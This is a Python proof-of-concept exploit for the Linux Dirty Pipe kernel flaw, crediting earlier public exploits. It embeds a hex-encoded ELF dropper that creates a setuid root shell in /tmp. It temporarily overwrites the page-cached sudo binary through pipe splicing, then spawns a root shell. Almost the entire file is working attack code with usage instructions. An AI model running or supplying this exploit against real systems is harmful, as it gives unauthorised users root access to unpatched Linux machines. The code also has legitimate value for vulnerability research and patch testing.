################################################################################
# Author:       Marc Bohler - https://github.com/crusoe112                     #
#                                                                              #
# Description:  Uses Dirty Pipe vulnerability to pop a root shell using Python #
#                                                                              #
# Credits:      This code basically combines 2 existing poc's for dirty pipe:  #
#                 https://github.com/febinrev/dirtypipez-exploit               #
#                 https://github.com/eremus-dev/Dirty-Pipe-sudo-poc            #
#               Those projects, in turn, borrowed directly from the OG:        #
#                 Max Kellermann max.kellermann@ionos.com                      #
#                 https://dirtypipe.cm4all.com/                                #
#                                                                              #
# Usage:        python dirty_py.py /usr/bin/sudo                               #
#                                                                              #
# Requirements: Requires python > 3.10 because of os.splice                    #
#                                                                              #
# Notes:        This exploit will overwrite a page of the file that resides in #
#               the page cache. It is unlikely to corrupt the actual file. If  #
#               there is corruption or an error, you likely just need to wait  #
#               until the page is overwritten, or restart your computer to fix #
#               any problems.                                                  #
#               That being said, I bear no responsibility for damage done by   #
#               this code, so please read carefully and hack responsibly.      #
#               Be sure to check out Max Kellerman's writeup at cm4all.com as  #
#               well.                                                          #
################################################################################

import argparse
import sys
import pty
import os

# Kernel page size
PAGE = 4096
# Linux pipe buffers are 64K
PIPESIZE = 65536

###########################################################
# Small (linux x86_64) ELF file matroshka doll that does: #
#   fd = open("/tmp/sh", O_WRONLY | O_CREAT | O_TRUNC);   #
#   write(fd, elfcode, elfcode_len)                       #
#   chmod("/tmp/sh", 04755)                               #
#   close(fd);                                            #
#   exit(0);                                              #
#                                                         #
# The dropped ELF simply does:                            #
#   setuid(0);                                            #
#   setgid(0);                                            #
#   execve("/bin/sh", ["/bin/sh", NULL], [NULL]);         #
#                                                         #
# Credit: https://github.com/febinrev/dirtypipez-exploit  #
###########################################################
elfcode = [
        0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 
        0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 
        0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02, 0x00, 0x00, 
        0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x89, 0xc7, 
        0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0xba, 0x00, 
        0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 
        0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1c, 
        0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00, 0x48, 0xc7, 
        0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 
        0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 
        0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 
        0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69, 0x00, 0x00, 
        0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a, 0x00, 0x00, 
        0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00, 0x6a, 0x00, 
        0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0, 0x3b, 0x00, 
        0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 
        0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
]


def backup_file(path):
    """Back up just for working on the POC"""
    with open(path, 'rb') as orig_file:
        with open('/tmp/backup_sudo', 'wb') as backup:
            data = orig_file.read()
            backup.write(data)


def prepare_pipe(read: int, write: int) -> None:
    """ Contaminate the pipe flags by filling and draining """
    data = b'a' * PIPESIZE

    written = os.write(write, data)
    print(f'[*] {written} bytes written to pipe')

    data = os.read(read, PIPESIZE)
    print(f'[*] {len(data)} bytes read from pipe')


def run_poc(data: bytes, path: str, file_offset: int) -> None:
    """ Open target file, contaminate the pipe buff, call splice, write into target file """
    print(f'[*] Opening {path}')
    target_file = os.open(path, os.O_RDONLY)

    print('[*] Opening PIPE')
    r, w = os.pipe()

    print('[*] Contaminating PIPE_BUF_CAN_MERGE flags')
    prepare_pipe(r, w)

    print(f'[*] Splicing byte from {path} to pipe')
    n = os.splice(
        target_file,
        w,
        1,
        offset_src=file_offset
    )

    print(f'[*] Spliced {n} bytes')

    print(f'[*] Altering {path}')
    n = os.write(w, data)

    print(f'[*] {n} bytes written to {path}')


def main():
    parser = argparse.ArgumentParser(description='Use dirty pipe vulnerability to pop root shell')
    parser.add_argument('path', help='Path to sudo file (e.g. /usr/bin/sudo)')
    args = parser.parse_args()

    print('[*] DirtyPy (Dirty Pipe POC)')
    backup_file(args.path)

    print(f'[*] Exploit will modify {args.path} binary in order to create root shell.')
    file_offset = 1

    # Ensure that we are not at a page boundary
    if file_offset % PAGE == 0:
        print(f'[x] Cannot exploit start of page boundary with offset {file_offset}')
        print('[x] Remember to clean up /tmp/backup_file')
        sys.exit(-1)
    if (file_offset | PAGE-1) + 1 < (file_offset + len(elfcode)):
        print(f'[x] Cannot perform exploit across page boundary with offset {file_offset}')
        print('[x] Remember to clean up /tmp/backup_file')
        sys.exit(-1)

    print(f'[*] Saving original state')
    with open(args.path, 'rb') as target_file:
        orig_data = target_file.read(len(elfcode) + 2)[2:]

    print(f'[*] Hijacking {args.path}') 
    run_poc(bytes(elfcode), args.path, file_offset)

    print(f'[*] Executing suid shell')
    os.system(args.path)

    print(f'[*] Restoring {args.path}')
    run_poc(orig_data, args.path, file_offset)

    print(f'[*] Popping root shell...')
    print()
    pty.spawn('/tmp/sh') 
    print()

    print('[*] Remember to cleanup /tmp/backup_file and /tmp/sh')
    print('[*]   rm /tmp/backup_sudo')
    print('[*]   rm /tmp/sh')


if __name__ == '__main__':
    main()
